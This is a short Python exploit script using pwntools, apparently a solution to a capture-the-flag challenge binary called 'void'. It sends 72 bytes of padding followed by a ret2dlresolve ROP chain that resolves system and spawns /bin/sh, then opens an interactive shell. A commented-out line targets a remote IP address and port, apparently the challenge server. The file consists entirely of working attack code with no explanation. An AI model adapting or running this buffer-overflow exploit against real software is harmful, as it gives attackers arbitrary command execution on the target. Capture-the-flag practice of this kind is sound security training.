from pwn import *


context.binary  = "./void"
binary = ELF("./void")
libc = ELF("./glibc/libc.so.6")
ld = ELF("./glibc/ld-linux-x86-64.so.2")




rop=ROP(context.binary)
dlresolve=Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh\0'])
rop.read(0,dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop=rop.chain()

#print(raw_rop)
#print(dlresolve.payload)

pay = b"a"*72 + raw_rop

#p = remote("83.136.249.46",42852)
p = process()
p.sendline(pay)
p.sendline(dlresolve.payload)
p.interactive()
